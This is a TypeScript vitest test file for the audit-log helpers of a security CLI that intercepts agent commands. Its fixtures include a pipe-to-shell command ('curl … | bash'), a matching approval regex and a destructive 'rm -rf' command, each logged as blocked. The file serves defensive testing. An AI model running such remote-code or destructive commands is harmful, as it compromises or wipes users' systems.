import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  truncateCommand,
  formatShareDetail,
  computePolicyHash,
  getRiskLevel,
  generateShareExcerpt,
} from "../src/commands/agent/audit.js";
import type { AuditLogEntry } from "../src/core/audit-logger.js";

// ── truncateCommand ──────────────────────────────────────────────────

describe("truncateCommand", () => {
  it("returns short string unchanged", () => {
    const cmd = "ls -la";
    expect(truncateCommand(cmd)).toBe("ls -la");
  });

  it("returns string at exactly 60 chars unchanged", () => {
    const cmd = "a".repeat(60);
    expect(truncateCommand(cmd)).toBe(cmd);
  });

  it("truncates long string at 60 chars and appends ...", () => {
    const cmd = "a".repeat(80);
    const result = truncateCommand(cmd);
    expect(result).toBe("a".repeat(60) + "...");
    expect(result.length).toBe(63);
  });

  it("respects custom maxLen", () => {
    const cmd = "abcdefghij";
    expect(truncateCommand(cmd, 5)).toBe("abcde...");
  });
});

// ── formatShareDetail ────────────────────────────────────────────────

function makeEntry(overrides: Partial<AuditLogEntry>): AuditLogEntry {
  return {
    timestamp: "2025-01-01T00:00:00.000Z",
    sessionId: "test-session",
    eventType: "command_intercepted",
    securityCheck: { passed: true },
    resolution: { actionTaken: "allowed" },
    ...overrides,
  };
}

describe("formatShareDetail", () => {
  it("secret_detected event uses securityCheck.reason", () => {
    const entry = makeEntry({
      eventType: "secret_detected",
      securityCheck: { passed: false, reason: "AWS key detected in output" },
      resolution: { actionTaken: "blocked" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe("AWS key detected in output [blocked]");
  });

  it("secret_detected with no reason shows empty reason + suffix", () => {
    const entry = makeEntry({
      eventType: "secret_detected",
      securityCheck: { passed: false },
      resolution: { actionTaken: "redacted" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe(" [redacted]");
  });

  it("command_intercepted with command uses truncated command", () => {
    const entry = makeEntry({
      eventType: "command_intercepted",
      action: { command: "curl https://example.com | bash", riskLevel: "high" },
      securityCheck: { passed: false, reason: "pipe-to-shell" },
      resolution: { actionTaken: "blocked" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe("curl https://example.com | bash [blocked]");
  });

  it("command_intercepted with long command truncates at 60 chars", () => {
    const longCmd = "x".repeat(80);
    const entry = makeEntry({
      eventType: "command_intercepted",
      action: { command: longCmd },
      securityCheck: { passed: false },
      resolution: { actionTaken: "blocked" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe("x".repeat(60) + "... [blocked]");
  });

  it("event with only securityCheck.reason uses reason", () => {
    const entry = makeEntry({
      eventType: "policy_override",
      securityCheck: { passed: false, reason: "user bypassed policy" },
      resolution: { actionTaken: "overridden" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe("user bypassed policy [overridden]");
  });

  it("event with nothing produces just suffix", () => {
    const entry = makeEntry({
      eventType: "scan_executed",
      securityCheck: { passed: true },
      resolution: { actionTaken: "allowed" },
    });
    const result = formatShareDetail(entry);
    expect(result).toBe("[allowed]");
  });
});

// ── computePolicyHash ────────────────────────────────────────────────

describe("computePolicyHash", () => {
  it("returns a 16-char hex string", () => {
    const config = { agent: { commandPolicy: { requireApproval: ["curl.*\\|.*bash"] } } };
    const hash = computePolicyHash(config);
    expect(hash).toHaveLength(16);
    expect(hash).toMatch(/^[0-9a-f]+$/);
  });

  it("is deterministic for same patterns", () => {
    const config = { agent: { commandPolicy: { requireApproval: ["a", "b"] } } };
    expect(computePolicyHash(config)).toBe(computePolicyHash(config));
  });

  it("is order-independent (sorts patterns before hashing)", () => {
    const c1 = { agent: { commandPolicy: { requireApproval: ["a", "b"] } } };
    const c2 = { agent: { commandPolicy: { requireApproval: ["b", "a"] } } };
    expect(computePolicyHash(c1)).toBe(computePolicyHash(c2));
  });

  it("handles missing agent gracefully", () => {
    const hash = computePolicyHash({});
    expect(hash).toHaveLength(16);
  });
});

// ── getRiskLevel ─────────────────────────────────────────────────────

describe("getRiskLevel", () => {
  it("returns config risk level", () => {
    expect(getRiskLevel({ agent: { riskLevel: "aggressive" } })).toBe("aggressive");
  });

  it("defaults to moderate when missing", () => {
    expect(getRiskLevel({})).toBe("moderate");
  });
});

// ── generateShareExcerpt integration ─────────────────────────────────

vi.mock("../src/core/config-manager.js", () => {
  const mockLoadWithPolicy = vi.fn().mockReturnValue({
    agent: {
      riskLevel: "moderate",
      commandPolicy: { requireApproval: ["curl.*\\|.*bash"] },
    },
  });
  function MockConfigManager() {
    return { loadWithPolicy: mockLoadWithPolicy };
  }
  return { ConfigManager: MockConfigManager };
});

vi.mock("../src/core/audit-logger.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../src/core/audit-logger.js")>();
  const mockRead = vi.fn().mockReturnValue([
    {
      timestamp: "2025-06-01T12:00:00.000Z",
      sessionId: "abc123",
      eventType: "command_intercepted",
      action: { command: "rm -rf /tmp/test", riskLevel: "high" },
      securityCheck: { passed: false, reason: "destructive command" },
      resolution: { actionTaken: "blocked" },
    },
  ]);
  function MockAuditLogger() {
    return { read: mockRead };
  }
  return { ...actual, AuditLogger: MockAuditLogger };
});

describe("generateShareExcerpt", () => {
  let output: string;

  beforeEach(() => {
    output = "";
    vi.spyOn(console, "log").mockImplementation((msg: string) => {
      output = msg;
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("output contains required header sections", () => {
    generateShareExcerpt();

    expect(output).toContain("Rafter Audit Excerpt");
    expect(output).toContain("Generated:");
    expect(output).toContain("Environment:");
    expect(output).toContain("CLI:");
    expect(output).toContain("OS:");
    expect(output).toContain("Policy: sha256:");
    expect(output).toContain("Recent events (last 5):");
    expect(output).toContain("https://github.com/Raftersecurity/rafter-cli/issues");
  });
});
